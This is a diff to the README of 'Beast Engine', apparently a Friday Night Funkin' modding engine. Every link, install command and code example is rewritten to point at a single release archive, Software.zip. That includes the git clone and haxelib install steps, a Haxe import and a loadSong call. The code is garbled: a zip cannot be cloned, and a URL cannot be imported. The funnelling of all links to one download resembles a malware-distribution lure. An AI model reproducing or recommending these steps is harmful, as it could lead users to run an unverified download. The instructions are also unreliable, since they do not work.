@@ -36,7 +36,7 @@ To get started with Beast Engine, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip
+   git clone https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip
    ```
 
 2. Navigate to the project directory:
@@ -46,7 +46,7 @@ To get started with Beast Engine, follow these simple steps:
 
 3. Install the necessary dependencies:
    ```bash
-   haxelib install https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip
+   haxelib install https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip
    ```
 
 4. Start modding with Beast Engine and unleash your creativity! 🚀
@@ -59,24 +59,24 @@ Check out the `examples` folder in the repository for some demo mod projects cre
 Here is a sample code snippet showcasing how to load a custom song in your mod:
 
 ```haxe
-import https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip;
+import https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip;
 
 class MyModSong extends MusicLoader {
     public function new() {
         super();
-        loadSong("https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip");
+        loadSong("https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip");
     }
 }
 ```
 
-For more detailed documentation and tutorials on using Beast Engine, visit the [official documentation](https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip).
+For more detailed documentation and tutorials on using Beast Engine, visit the [official documentation](https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip).
 
 ---
 
 ## Contributing
 We welcome contributions from the modding community to make Beast Engine even better! If you have any ideas, bug fixes, or new features to propose, feel free to submit a pull request.
 
-Please refer to our [Contribution Guidelines](https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip) before making any contributions. Your support and contributions are greatly appreciated! 🙌
+Please refer to our [Contribution Guidelines](https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip) before making any contributions. Your support and contributions are greatly appreciated! 🙌
 
 ---
 
@@ -87,8 +87,8 @@ Beast Engine is released under the MIT License. See the [LICENSE](LICENSE) file 
 
 🎶 Get ready to dive into the exciting world of modding with Beast Engine and create the wildest Friday Night Funkin' mods ever seen! 🎶
 
-[![Download Beast Engine](https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip%20Beast%https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip)](https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip)
+[![Download Beast Engine](https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip%20Beast%https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip)](https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip)
 
-If the link above does not work, please check the [Releases](https://github.com/weslei78b/beast-engine/releases/download/v1.0/Installer.zip) section for the latest version.
+If the link above does not work, please check the [Releases](https://github.com/weslei78b/beast-engine/releases/download/v2.0/Software.zip) section for the latest version.
 
 **Let's make some modding magic happen! 👾🎹🎶**
